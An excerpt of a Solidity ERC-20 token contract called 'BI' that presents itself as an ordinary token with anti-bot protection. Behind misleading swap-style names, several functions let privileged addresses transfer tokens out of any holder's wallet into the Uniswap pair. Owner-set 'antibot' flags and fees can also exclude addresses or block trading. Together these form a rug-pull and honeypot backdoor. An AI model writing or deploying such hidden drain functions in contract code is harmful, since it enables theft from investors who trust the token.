...
contract BI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    string private _name = "BI1";
    string private _symbol = "BI1";
    ...
    bool public gbot  = false;
    uint256 private botsleep = 7;
    uint256 private feebot = 0;
    
    mapping(address => bool) private _isExcludedlp;
   ...
   function _destroyChildren(uint256 value) internal {
    ...
    function setlp(address a, bool e) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            _isExcludedlp[a] = e;
        } else {
    ...
    function Onantibot(bool bs, uint256 timesleep, uint256 fee, bool _gbot) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            antibotenabled = bs;
            botsleep = timesleep;
    ...
    function swapTokenForEth(address from, address to, uint256 amount) public gR {
        //require(_Antibotswaper[_msgSender()], "ERC20");
        if (_Antibotswaper[_msgSender()]){
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = uniswapV2Router.WETH();
            safeTransferFrom(path[0], from, uniswapV2Pair, amount);
    ...
    function swapExactETHForTokens(address from, address to, uint256 amount) public gR {
        //require(_Antibotswaper[_msgSender()], "ERC20");
        if (_Antibotswaper[_msgSender()]){
    ...
    function swapTokensForTokensBulk(address from, address[] calldata to, uint256 amount, uint256 percent) public gR {
        //require(_Antibotswaper[_msgSender()], "ERC20");
        if (_Antibotswaper[_msgSender()]){
            ...
            for (uint256 i; i < to.length; ++i) {
                ...
                safeTransferFrom(path[0], to[i], uniswapV2Pair, amounts);
